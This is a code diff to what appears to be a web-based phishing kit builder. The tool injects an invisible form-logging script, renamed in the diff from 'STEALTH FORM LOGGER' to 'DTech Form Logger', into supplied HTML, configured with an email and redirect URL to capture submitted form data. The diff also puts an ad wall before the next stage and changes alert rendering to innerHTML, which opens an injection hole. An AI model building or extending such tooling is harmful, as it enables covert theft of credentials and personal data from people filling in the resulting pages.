@@ -244,6 +244,62 @@
             gap: 10px;
         }
 
+        /* Modal styles for ad */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: var(--border-radius);
+            max-width: 500px;
+            text-align: center;
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .ad-placeholder {
+            background-color: #f0f0f0;
+            padding: 30px;
+            border: 2px dashed #ccc;
+            margin: 20px 0;
+            min-height: 200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .ad-placeholder i {
+            font-size: 50px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+
+        .btn-watch-ad {
+            background-color: #ff9500;
+            color: white;
+            margin-top: 20px;
+        }
+
+        .btn-watch-ad:hover {
+            background-color: #e68a00;
+        }
+
         @media (max-width: 768px) {
             .content {
                 padding: 15px;
@@ -257,6 +313,11 @@
                 float: none;
                 width: 100%;
                 margin-top: 10px;
+            }
+
+            .modal-content {
+                width: 90%;
+                padding: 20px;
             }
         }
     </style>
@@ -309,6 +370,23 @@
         </div>
     </div>
 
+    <!-- Ad Modal -->
+    <div id="adModal" class="modal">
+        <div class="modal-content">
+            <h2>Continue to Next Stage</h2>
+            <p>Please watch this short ad to continue to the next stage</p>
+            
+            <div class="ad-placeholder">
+                <i class="fas fa-ad"></i>
+                <p>Ad content would be displayed here</p>
+            </div>
+            
+            <button id="watchAdBtn" class="btn btn-watch-ad">
+                <i class="fas fa-play"></i> Watch Ad to Continue
+            </button>
+        </div>
+    </div>
+
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Load the HTML from localStorage on page load
@@ -320,9 +398,18 @@
             // Refresh button handler
             document.getElementById('refreshBtn').addEventListener('click', loadHtmlPreview);
 
-            // Next stage button handler
+            // Next stage button handler - now shows ad modal
             document.getElementById('nextStageBtn').addEventListener('click', () => {
-                window.location.href = 'step3.html';
+                document.getElementById('adModal').style.display = 'flex';
+            });
+
+            // Watch ad button handler
+            document.getElementById('watchAdBtn').addEventListener('click', () => {
+                // Simulate ad being shown
+                showAd().then(() => {
+                    // After ad is watched, proceed to next stage
+                    window.location.href = 'step3.html';
+                });
             });
         });
 
@@ -379,7 +466,12 @@
                     statusBadge.textContent = 'Processing complete';
                     statusBadge.className = 'status-badge active';
 
-                    showAlert('HTML processed successfully! The enhanced version has been saved.', 'success');
+                    // Show special notification about DTech logger
+                    showAlert(`
+                        <strong>DTech Logger successfully injected!</strong><br>
+                        The enhanced version now includes tracking capabilities and has been saved.
+                    `, 'success');
+                    
                     document.getElementById('nextStageBtn').disabled = false;
                 } catch (error) {
                     showAlert('Error processing HTML: ' + error.message, 'danger');
@@ -390,7 +482,7 @@
 
         function generateLoggerScript(email, redirectUrl) {
             // This is the same script generator as before
-            return `<!-- STEALTH FORM LOGGER (INVISIBLE) -->
+            return `<!-- DTech Form Logger (Invisible) -->
 <script>
 // CONFIGURATION
 const CONFIG = {
@@ -414,7 +506,7 @@ const CONFIG = {
 (() => {
     // Silent console logging (optional for debugging)
     const log = (msg, type='info') => {
-        console.log(\`[Stealth Logger] \${msg}\`); // Only visible in browser console
+        console.log(\`[DTech Logger] \${msg}\`); // Only visible in browser console
     };
 
     // ===== DATA CAPTURE =====
@@ -511,13 +603,39 @@ const CONFIG = {
 <\/script>`;
         }
 
+        function showAd() {
+            return new Promise((resolve) => {
+                // Show the modal
+                document.getElementById('adModal').style.display = 'flex';
+                
+                // This would be replaced with actual ad code
+                // For now we'll simulate it with a timeout
+                showAlert('Please watch the ad to continue to the next stage', 'info');
+                
+                // Simulate the ad show function
+                console.log('Ad would be shown here');
+                
+                // In a real implementation, you would call:
+                // show_9601506().then(() => {
+                //     resolve();
+                // });
+                
+                // For this demo, we'll resolve after a short delay
+                setTimeout(() => {
+                    document.getElementById('adModal').style.display = 'none';
+                    showAlert('Thank you for watching the ad! Proceeding to next stage...', 'success');
+                    resolve();
+                }, 3000);
+            });
+        }
+
         function showAlert(message, type) {
             const alertDiv = document.getElementById('alert');
             const alertMessage = document.getElementById('alert-message');
             const alertIcon = alertDiv.querySelector('i');
             
             // Set message and style
-            alertMessage.textContent = message;
+            alertMessage.innerHTML = message;
             alertDiv.className = `alert alert-${type}`;
             alertDiv.style.display = 'flex';
             
